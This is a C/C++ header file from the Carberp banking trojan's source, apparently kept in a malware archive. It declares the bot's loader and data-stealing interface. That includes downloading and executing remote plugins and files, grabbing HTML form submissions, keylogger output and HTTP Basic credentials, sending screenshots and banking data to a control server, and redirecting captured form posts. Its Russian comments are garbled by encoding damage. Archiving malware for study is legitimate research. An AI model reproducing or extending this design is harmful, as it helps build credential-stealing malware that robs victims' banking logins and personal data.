/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef LoaderH
#define LoaderH
//----------------------------------------------------------------------------

#include <windows.h>

#include "BotHTTP.h"
#include "BotClasses.h"

typedef struct TSendHTMLData
{
	PCHAR URL;         // �����, �������� ������
	DWORD BrowserType; // ��� ��������
	PCHAR UserAgent;   // ��� ������
	DWORD DataType;    // ��� ������������ ������
	PCHAR Data;        // ������������ ������
	PCHAR BotID;       // ������������� ����

} *PSendHTMLData;


bool CheckHost( char *Host );

//bool GrabberReports( char *Url, char *Buffer, DWORD dwBufSize );

//****************************************************************************
//  DownloadPlugin - ������� ��������� � ������� ������ (DLL)
//****************************************************************************
LPVOID DownloadPlugin(PCHAR URL);



bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  );

bool DownloadInFile( char *Url, WCHAR *FileName );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );


bool MySend( SOCKET Socket, const char *Data, int DataLen );
char **GetRealAddress( char *Host );

//bool WINAPI SendFormGrabberLogs(char *URL, char *Logs, char *UserAgent, DWORD dwBrowser, DWORD dwType );
bool SendFirstInfo();
bool SendTradeInfo( char *Buffer );

char *GetInfoFromBcServer( char *Url );
bool SendScreen( LPVOID lpFile, DWORD dwFileSize );

bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize );

void SetSBStarted(bool bStartHideJava_SB);
bool GetSBStarted();

bool ExecuteFile( char *Url, WCHAR *FileName );

#define HTONS(x) (((x) << 8) | ((x) >> 8))


//****************************************************************************
//  SendGrabberReport - ������� ���������� ����� � ����������� �������
//****************************************************************************
bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize);

// ������� ���������� ������ �� ������
//bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

//------------------------ ����������� �������� ������ ---------------------//

// ������� �������� ������
typedef void (*PSendDataEvent)(PSendHTMLData, // ������ �� ������������ ������
							   bool&,	      // �������� �������� ������� ���������
							   bool&);        // �������� �������� �������� ������

// ����� ���������
enum THandleDataMode  {hdmUnknown,   // ����� �� ����������
					   hdmDuplicate, // ����������� �� ��������� �����
					   hdmRedirect   // �������������� �� ��������� �����
					   };

// ���������������� ���������� ��������
DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL);

//----------------------------------------------------------------------------
/// ������� ����������� ��� ���������� RuBnk
typedef struct
{
	char *FilePath;
	DWORD dwType;
} BSSINIST, *PBSSINIST;

//#ifdef RuBnkH
DWORD WINAPI SendBSSInist( LPVOID lpData);
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved );
//#endif



//****************************************************************************
//  DataGrabber - ������� ��� ������ � ������������� �������
//****************************************************************************


#define DATA_BLOCK_URL       1
#define DATA_BLOCK_USERAGENT 2
#define DATA_BLOCK_DATA      3


// ���� ������������ �� ������ ������
#define DATA_TYPE_FORM   1
#define DATA_TYPE_INJECT 2
#define DATA_TYPE_KEYLOG 3


namespace DataGrabber
{
	// ������� ���������� ���� � ����� ��������� ������
	PCHAR GetRepositoryPath();

	// ������� ���������� ���������� ��� ����� ��� �������� ������
	PCHAR GetDataFileName();

	// ������� ���������� ������, ������� ����� ����������� �����
	PCHAR GetRepositoryPassword();

	// ��������� ���� ������ �� ������
    bool SendDataFile(PCHAR FileName);

	// ��������� ����� ���������� �������� ������
	void StartDataSender();


	//---------------------------------------------------------------
	// ������ ���������� ������ � ���������, ��� ���������� ��������
	//---------------------------------------------------------------

	// ������� ���������� ������ � ��������� ��� ����������� ��������
	bool AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);

	// �������� ������ HTML �����
    bool AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);


	// ������� ��������� ������ BASIC ����������� ��� �������� �� ������
	void AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);


	//---------------------------------------------------------------
	// ������ �������� ������
	//---------------------------------------------------------------

	// ��������� ������ HTML ����
	bool SendFormGrabberData(PDataFile File);


	// �������������� ������ ��������
	bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

	// ��������� ���� ���������
    bool SendKeyLogerData(PDataFile File);
}


//----------------------------------------------------------------------------
#endif



